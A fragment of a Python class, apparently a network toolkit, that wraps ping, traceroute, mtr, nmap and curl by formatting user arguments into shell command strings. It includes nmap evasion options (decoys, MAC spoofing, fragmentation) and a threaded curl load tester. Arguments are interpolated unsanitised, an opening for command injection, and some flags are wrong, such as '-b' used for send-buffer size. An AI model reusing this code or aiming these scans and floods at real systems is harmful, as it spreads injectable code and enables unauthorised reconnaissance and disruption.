        return self._generic(f'ping -I {args[1]} {args[0]}')
    
    def _ping_source(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_source <target> <ip>'}
        return self._generic(f'ping -S {args[1]} {args[0]}')
    
    def _ping_pattern(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_pattern <target> <pattern>'}
        return self._generic(f'ping -p {args[1]} {args[0]}')
    
    def _ping_record(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping_record <target>'}
        return self._generic(f'ping -R {args[0]}')
    
    def _ping_timestamp(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping_timestamp <target>'}
        return self._generic(f'ping -D {args[0]}')
    
    def _ping_quiet(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping_quiet <target>'}
        return self._generic(f'ping -q -c 5 {args[0]}')
    
    def _ping_verbose(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping_verbose <target>'}
        return self._generic(f'ping -v {args[0]}')
    
    def _ping_deadline(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_deadline <target> <sec>'}
        return self._generic(f'ping -w {args[1]} {args[0]}')
    
    def _ping_numeric(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping_numeric <target>'}
        return self._generic(f'ping -n {args[0]}')
    
    def _ping_adaptive(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping_adaptive <target>'}
        return self._generic(f'ping -A {args[0]}')
    
    def _ping_audible(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping_audible <target>'}
        return self._generic(f'ping -a {args[0]}')
    
    def _ping_broadcast(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping_broadcast <target>'}
        return self._generic(f'ping -b {args[0]}')
    
    def _ping_bypass_route(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping_bypass_route <target>'}
        return self._generic(f'ping -r {args[0]}')
    
    def _ping_flow_label(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_flow_label <target> <label>'}
        return self._generic(f'ping -F {args[1]} {args[0]}')
    
    def _ping_mark(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_mark <target> <mark>'}
        return self._generic(f'ping -m {args[1]} {args[0]}')
    
    def _ping_pmtudisc(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_pmtudisc <target> <mode>'}
        return self._generic(f'ping -M {args[1]} {args[0]}')
    
    def _ping_quality(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping_quality <target>'}
        return self._generic(f'ping -Q {args[0]}')
    
    def _ping_rate(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_rate <target> <rate>'}
        return self._generic(f'ping -l {args[1]} {args[0]}')
    
    def _ping_sndbuf(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_sndbuf <target> <size>'}
        return self._generic(f'ping -b {args[1]} {args[0]}')
    
    # Traceroute methods (35+)
    def _traceroute(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        result = self.tools.traceroute(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _traceroute6(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute6 <target>'}
        return self._generic(f'traceroute6 {args[0]}')
    
    def _traceroute_tcp(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_tcp <target>'}
        return self._generic(f'traceroute -T {args[0]}')
    
    def _traceroute_udp(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_udp <target>'}
        return self._generic(f'traceroute -U {args[0]}')
    
    def _traceroute_icmp(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_icmp <target>'}
        return self._generic(f'traceroute -I {args[0]}')
    
    def _traceroute_max_hops(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_max_hops <target> <hops>'}
        return self._generic(f'traceroute -m {args[1]} {args[0]}')
    
    def _traceroute_first_hop(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_first_hop <target> <hop>'}
        return self._generic(f'traceroute -f {args[1]} {args[0]}')
    
    def _traceroute_queries(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_queries <target> <queries>'}
        return self._generic(f'traceroute -q {args[1]} {args[0]}')
    
    def _traceroute_wait(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_wait <target> <sec>'}
        return self._generic(f'traceroute -w {args[1]} {args[0]}')
    
    def _traceroute_port(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_port <target> <port>'}
        return self._generic(f'traceroute -p {args[1]} {args[0]}')
    
    def _traceroute_numeric(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_numeric <target>'}
        return self._generic(f'traceroute -n {args[0]}')
    
    def _traceroute_verbose(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_verbose <target>'}
        return self._generic(f'traceroute -v {args[0]}')
    
    def _traceroute_bypass(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_bypass <target>'}
        return self._generic(f'traceroute -r {args[0]}')
    
    def _traceroute_debug(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_debug <target>'}
        return self._generic(f'traceroute -d {args[0]}')
    
    def _traceroute_firewall(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_firewall <target>'}
        return self._generic(f'traceroute -F {args[0]}')
    
    def _traceroute_gateway(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_gateway <target>'}
        return self._generic(f'traceroute -g {args[0]}')
    
    def _traceroute_icmp_echo(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_icmp_echo <target>'}
        return self._generic(f'traceroute -I {args[0]}')
    
    def _traceroute_ipv6(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_ipv6 <target>'}
        return self._generic(f'traceroute6 {args[0]}')
    
    def _traceroute_max_ttl(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_max_ttl <target> <ttl>'}
        return self._generic(f'traceroute -m {args[1]} {args[0]}')
    
    def _traceroute_min_ttl(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_min_ttl <target> <ttl>'}
        return self._generic(f'traceroute -f {args[1]} {args[0]}')
    
    def _mtr(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: mtr <target>'}
        return self._generic(f'mtr {args[0]}')
    
    def _mtr_report(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: mtr_report <target>'}
        return self._generic(f'mtr --report {args[0]}')
    
    def _mtr_json(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: mtr_json <target>'}
        return self._generic(f'mtr --json {args[0]}')
    
    def _mtr_csv(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: mtr_csv <target>'}
        return self._generic(f'mtr --csv {args[0]}')
    
    def _tcptraceroute(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: tcptraceroute <target>'}
        return self._generic(f'tcptraceroute {args[0]}')
    
    def _lft(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: lft <target>'}
        return self._generic(f'lft {args[0]}')
    
    def _tracepath(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: tracepath <target>'}
        return self._generic(f'tracepath {args[0]}')
    
    def _pathping(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: pathping <target>'}
        return self._generic(f'pathping {args[0]}')
    
    # Nmap methods (80+)
    def _nmap(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        result = self.tools.nmap(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_quick(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_quick <target>'}
        result = self.tools.nmap(args[0], 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_full(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_full <target>'}
        result = self.tools.nmap(args[0], 'full')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_os(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_os <target>'}
        result = self.tools.nmap(args[0], 'os')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_service(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_service <target>'}
        result = self.tools.nmap(args[0], 'service')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_udp(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_udp <target>'}
        result = self.tools.nmap(args[0], 'udp')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_vuln(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_vuln <target>'}
        result = self.tools.nmap(args[0], 'vuln')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_stealth(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_stealth <target>'}
        result = self.tools.nmap(args[0], 'stealth')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_ping(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_ping <target>'}
        result = self.tools.nmap(args[0], 'ping')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_ports(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_ports <target> <ports>'}
        return self._generic(f'nmap -p {args[1]} {args[0]}')
    
    def _nmap_script(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_script <target> <script>'}
        return self._generic(f'nmap --script {args[1]} {args[0]}')
    
    def _nmap_aggressive(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_aggressive <target>'}
        result = self.tools.nmap(args[0], 'aggressive')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_traceroute(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_traceroute <target>'}
        return self._generic(f'nmap --traceroute {args[0]}')
    
    def _nmap_output(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_output <target> <file>'}
        return self._generic(f'nmap -oN {args[1]} {args[0]}')
    
    def _nmap_exclude(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_exclude <target> <exclude>'}
        return self._generic(f'nmap --exclude {args[1]} {args[0]}')
    
    def _nmap_input(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_input <file>'}
        return self._generic(f'nmap -iL {args[0]}')
    
    def _nmap_random(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_random <count>'}
        return self._generic(f'nmap -iR {args[0]}')
    
    def _nmap_timing(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_timing <target> <level>'}
        return self._generic(f'nmap -T{args[1]} {args[0]}')
    
    def _nmap_syn(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_syn <target>'}
        return self._generic(f'nmap -sS {args[0]}')
    
    def _nmap_connect(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_connect <target>'}
        return self._generic(f'nmap -sT {args[0]}')
    
    def _nmap_ack(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_ack <target>'}
        return self._generic(f'nmap -sA {args[0]}')
    
    def _nmap_fin(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_fin <target>'}
        return self._generic(f'nmap -sF {args[0]}')
    
    def _nmap_xmas(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_xmas <target>'}
        return self._generic(f'nmap -sX {args[0]}')
    
    def _nmap_null(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_null <target>'}
        return self._generic(f'nmap -sN {args[0]}')
    
    def _nmap_script_default(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_script_default <target>'}
        return self._generic(f'nmap -sC {args[0]}')
    
    def _nmap_top_ports(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_top_ports <target> <count>'}
        return self._generic(f'nmap --top-ports {args[1]} {args[0]}')
    
    def _nmap_open(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_open <target>'}
        return self._generic(f'nmap --open {args[0]}')
    
    def _nmap_reason(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_reason <target>'}
        return self._generic(f'nmap --reason {args[0]}')
    
    def _nmap_packet_trace(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_packet_trace <target>'}
        return self._generic(f'nmap --packet-trace {args[0]}')
    
    def _nmap_iflist(self, args):
        return self._generic('nmap --iflist')
    
    def _nmap_no_ping(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_no_ping <target>'}
        return self._generic(f'nmap -Pn {args[0]}')
    
    def _nmap_fast(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_fast <target>'}
        return self._generic(f'nmap -F {args[0]}')
    
    def _nmap_fragment(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_fragment <target>'}
        return self._generic(f'nmap -f {args[0]}')
    
    def _nmap_decoys(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_decoys <target> <count>'}
        return self._generic(f'nmap -D RND:{args[1]} {args[0]}')
    
    def _nmap_source_port(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_source_port <target> <port>'}
        return self._generic(f'nmap -g {args[1]} {args[0]}')
    
    def _nmap_data_length(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_data_length <target> <length>'}
        return self._generic(f'nmap --data-length {args[1]} {args[0]}')
    
    def _nmap_ttl(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_ttl <target> <ttl>'}
        return self._generic(f'nmap --ttl {args[1]} {args[0]}')
    
    def _nmap_spoof_mac(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_spoof_mac <target> <mac>'}
        return self._generic(f'nmap --spoof-mac {args[1]} {args[0]}')
    
    def _nmap_badsum(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_badsum <target>'}
        return self._generic(f'nmap --badsum {args[0]}')
    
    def _nmap_send_eth(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_send_eth <target>'}
        return self._generic(f'nmap --send-eth {args[0]}')
    
    def _nmap_send_ip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_send_ip <target>'}
        return self._generic(f'nmap --send-ip {args[0]}')
    
    def _nmap_smb(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_smb <target>'}
        return self._generic(f'nmap --script smb-* {args[0]}')
    
    def _nmap_snmp(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_snmp <target>'}
        return self._generic(f'nmap --script snmp-* {args[0]}')
    
    def _nmap_ssh(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_ssh <target>'}
        return self._generic(f'nmap --script ssh-* {args[0]}')
    
    def _nmap_http(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_http <target>'}
        return self._generic(f'nmap --script http-* {args[0]}')
    
    def _nmap_ftp(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_ftp <target>'}
        return self._generic(f'nmap --script ftp-* {args[0]}')
    
    def _nmap_smtp(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_smtp <target>'}
        return self._generic(f'nmap --script smtp-* {args[0]}')
    
    def _nmap_dns(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_dns <target>'}
        return self._generic(f'nmap --script dns-* {args[0]}')
    
    def _nmap_mysql(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_mysql <target>'}
        return self._generic(f'nmap --script mysql-* {args[0]}')
    
    def _nmap_mssql(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_mssql <target>'}
        return self._generic(f'nmap --script ms-sql-* {args[0]}')
    
    def _nmap_oracle(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_oracle <target>'}
        return self._generic(f'nmap --script oracle-* {args[0]}')
    
    def _nmap_rdp(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_rdp <target>'}
        return self._generic(f'nmap --script rdp-* {args[0]}')
    
    def _nmap_vnc(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_vnc <target>'}
        return self._generic(f'nmap --script vnc-* {args[0]}')
    
    def _nmap_sip(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_sip <target>'}
        return self._generic(f'nmap --script sip-* {args[0]}')
    
    def _nmap_upnp(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_upnp <target>'}
        return self._generic(f'nmap --script upnp-* {args[0]}')
    
    def _nmap_broadcast(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap_broadcast <target>'}
        return self._generic(f'nmap --script broadcast-* {args[0]}')
    
    def _nmap_script_help(self, args):
        return self._generic('nmap --script-help all')
    
    # Curl methods (80+)
    def _curl(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl <url>'}
        result = self.tools.curl(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_get(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_get <url>'}
        return self._generic(f'curl -s {args[0]}')
    
    def _curl_post(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_post <url> <data>'}
        return self._generic(f'curl -s -X POST -d "{args[1]}" {args[0]}')
    
    def _curl_put(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_put <url> <data>'}
        return self._generic(f'curl -s -X PUT -d "{args[1]}" {args[0]}')
    
    def _curl_delete(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_delete <url>'}
        return self._generic(f'curl -s -X DELETE {args[0]}')
    
    def _curl_patch(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_patch <url> <data>'}
        return self._generic(f'curl -s -X PATCH -d "{args[1]}" {args[0]}')
    
    def _curl_head(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_head <url>'}
        return self._generic(f'curl -s -I {args[0]}')
    
    def _curl_options(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_options <url>'}
        return self._generic(f'curl -s -X OPTIONS {args[0]}')
    
    def _curl_output(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_output <url> <file>'}
        return self._generic(f'curl -s -o {args[1]} {args[0]}')
    
    def _curl_remote_name(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_remote_name <url>'}
        return self._generic(f'curl -s -O {args[0]}')
    
    def _curl_location(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_location <url>'}
        return self._generic(f'curl -s -L {args[0]}')
    
    def _curl_include(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_include <url>'}
        return self._generic(f'curl -s -i {args[0]}')
    
    def _curl_verbose(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_verbose <url>'}
        return self._generic(f'curl -v {args[0]}')
    
    def _curl_silent(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_silent <url>'}
        return self._generic(f'curl -s {args[0]}')
    
    def _curl_show_error(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_show_error <url>'}
        return self._generic(f'curl -sS {args[0]}')
    
    def _curl_fail(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_fail <url>'}
        return self._generic(f'curl -sf {args[0]}')
    
    def _curl_insecure(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_insecure <url>'}
        return self._generic(f'curl -sk {args[0]}')
    
    def _curl_data(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data <url> <data>'}
        return self._generic(f'curl -s -d "{args[1]}" {args[0]}')
    
    def _curl_data_binary(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data_binary <url> <file>'}
        return self._generic(f'curl -s --data-binary @{args[1]} {args[0]}')
    
    def _curl_data_urlencode(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data_urlencode <url> <data>'}
        return self._generic(f'curl -s --data-urlencode "{args[1]}" {args[0]}')
    
    def _curl_form(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: curl_form <url> <name> <value>'}
        return self._generic(f'curl -s -F "{args[1]}={args[2]}" {args[0]}')
    
    def _curl_header(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_header <url> <header>'}
        return self._generic(f'curl -s -H "{args[1]}" {args[0]}')
    
    def _curl_user_agent(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_user_agent <url> <agent>'}
        return self._generic(f'curl -s -A "{args[1]}" {args[0]}')
    
    def _curl_referer(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_referer <url> <referer>'}
        return self._generic(f'curl -s -e "{args[1]}" {args[0]}')
    
    def _curl_user(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_user <url> <user:pass>'}
        return self._generic(f'curl -s -u "{args[1]}" {args[0]}')
    
    def _curl_cookie(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cookie <url> <cookie>'}
        return self._generic(f'curl -s -b "{args[1]}" {args[0]}')
    
    def _curl_cookie_jar(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cookie_jar <url> <file>'}
        return self._generic(f'curl -s -c {args[1]} {args[0]}')
    
    def _curl_proxy(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy <url> <proxy>'}
        return self._generic(f'curl -s -x {args[1]} {args[0]}')
    
    def _curl_cert(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cert <url> <cert>'}
        return self._generic(f'curl -s -E {args[1]} {args[0]}')
    
    def _curl_key(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_key <url> <key>'}
        return self._generic(f'curl -s --key {args[1]} {args[0]}')
    
    def _curl_cacert(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cacert <url> <ca>'}
        return self._generic(f'curl -s --cacert {args[1]} {args[0]}')
    
    def _curl_tlsv1_2(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_tlsv1_2 <url>'}
        return self._generic(f'curl -s --tlsv1.2 {args[0]}')
    
    def _curl_tlsv1_3(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_tlsv1_3 <url>'}
        return self._generic(f'curl -s --tlsv1.3 {args[0]}')
    
    def _curl_continue(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_continue <url>'}
        return self._generic(f'curl -s -C - {args[0]}')
    
    def _curl_range(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_range <url> <range>'}
        return self._generic(f'curl -s -r {args[1]} {args[0]}')
    
    def _curl_limit_rate(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_limit_rate <url> <rate>'}
        return self._generic(f'curl -s --limit-rate {args[1]} {args[0]}')
    
    def _curl_max_time(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_max_time <url> <sec>'}
        return self._generic(f'curl -s -m {args[1]} {args[0]}')
    
    def _curl_connect_timeout(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_connect_timeout <url> <sec>'}
        return self._generic(f'curl -s --connect-timeout {args[1]} {args[0]}')
    
    def _curl_retry(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_retry <url> <count>'}
        return self._generic(f'curl -s --retry {args[1]} {args[0]}')
    
    def _curl_ipv4(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_ipv4 <url>'}
        return self._generic(f'curl -s -4 {args[0]}')
    
    def _curl_ipv6(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_ipv6 <url>'}
        return self._generic(f'curl -s -6 {args[0]}')
    
    def _curl_interface(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_interface <url> <iface>'}
        return self._generic(f'curl -s --interface {args[1]} {args[0]}')
    
    def _curl_http2(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_http2 <url>'}
        return self._generic(f'curl -s --http2 {args[0]}')
    
    def _curl_compressed(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_compressed <url>'}
        return self._generic(f'curl -s --compressed {args[0]}')
    
    def _curl_write_out(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_write_out <url> <format>'}
        return self._generic(f'curl -s -w "{args[1]}" -o /dev/null {args[0]}')
    
    def _curl_dump_header(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_dump_header <url> <file>'}
        return self._generic(f'curl -s -D {args[1]} {args[0]}')
    
    def _curl_trace(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_trace <url> <file>'}
        return self._generic(f'curl -s --trace {args[1]} {args[0]}')
    
    def _curl_help(self, args):
        return self._generic('curl --help')
    
    def _curl_version(self, args):
        return self._generic('curl --version')
    
    def _curl_parallel(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_parallel <url1> <url2>'}
        return self._generic(f'curl -s -Z "{args[0]}" "{args[1]}"')
    
    def _curl_json(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_json <url> <json>'}
        return self._generic(f'curl -s --json "{args[1]}" {args[0]}')
    
    def _curl_socks5(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_socks5 <url> <proxy>'}
        return self._generic(f'curl -s --socks5 {args[1]} {args[0]}')
    
    def _curl_upload(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_upload <url> <file>'}
        return self._generic(f'curl -s -T {args[1]} {args[0]}')
    
    def _curl_ftp(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_ftp <ftp_url>'}
        return self._generic(f'curl -s {args[0]}')
    
    def _curl_batch(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_batch <urls_file>'}
        try:
            with open(args[0], 'r') as f:
                urls = f.read().strip().splitlines()
            output = ""
            for url in urls:
                result = self.tools.curl(url)
                output += f"\n=== {url} ===\n{result.output}\n"
            return {'success': True, 'output': output}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _curl_webhook(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: curl_webhook <url> <webhook> <message>'}
        return self._generic(f'curl -s -X POST -H "Content-Type: application/json" -d \'{{"text": "{args[2]}", "url": "{args[0]}"}}\' {args[1]}')
    
    def _curl_health(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_health <url>'}
        result = self.tools.curl(args[0])
        if result.success and result.output:
            return {'success': True, 'output': f"✅ {args[0]} is healthy"}
        return {'success': False, 'output': f"❌ {args[0]} is not healthy"}
    
    def _curl_benchmark(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_benchmark <url> <iterations>'}
        url = args[0]
        iterations = int(args[1])
        times = []
        for _ in range(iterations):
            start = time.time()
            result = self.tools.curl(url)
            end = time.time()
            times.append(end - start)
        avg = sum(times) / len(times)
        output = f"Benchmark Results for {url} ({iterations} iterations):\n"
        output += f"  Average: {avg:.3f}s\n  Min: {min(times):.3f}s\n  Max: {max(times):.3f}s"
        return {'success': True, 'output': output}
    
    def _curl_loadtest(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: curl_loadtest <url> <concurrency> <duration>'}
        url = args[0]
        concurrency = int(args[1])
        duration = int(args[2])
        results = []
        
        def worker():
            end_time = time.time() + duration
            count = 0
            while time.time() < end_time:
                self.tools.curl(url)
                count += 1
            results.append(count)
        
        threads = []
        for _ in range(concurrency):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)
        
        time.sleep(duration + 2)
        total_requests = sum(results)
        output = f"Load Test Results for {url}:\n"
        output += f"  Concurrency: {concurrency}\n  Duration: {duration}s\n"
        output += f"  Total Requests: {total_requests}\n  Requests/sec: {total_requests/duration:.2f}"
        return {'success': True, 'output': output}
    
    def _curl_download(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_download <url> <file>'}
        return self._generic(f'curl -s -o {args[1]} {args[0]}')
    
    def _curl_resume(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_resume <url> <file>'}
        return self._generic(f'curl -s -C - -o {args[1]} {args[0]}')
    
    def _curl_multiple(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_multiple <url1> <url2>'}
        return self._generic(f'curl -s -O "{args[0]}" -O "{args[1]}"')
    
    def _curl_config(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_config <file>'}
        return self._generic(f'curl -s -K {args[0]}')
    
    def _curl_netrc(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_netrc <url>'}
        return self._generic(f'curl -s -n {args[0]}')
    
    def _curl_oauth2(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_oauth2 <url> <token>'}
        return self._generic(f'curl -s -H "Authorization: Bearer {args[1]}" {args[0]}')
    
    def _curl_aws(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_aws <url> <key:secret>'}
        return self._generic(f'curl -s --aws-sigv4 "aws:amz:us-east-1:s3" -u "{args[1]}" {args[0]}')
    
    def _curl_http3(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_http3 <url>'}
        return self._generic(f'curl -s --http3 {args[0]}')
    
    def _curl_proxy_tunnel(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy_tunnel <url> <proxy>'}
        return self._generic(f'curl -s -p -x {args[1]} {args[0]}')
    
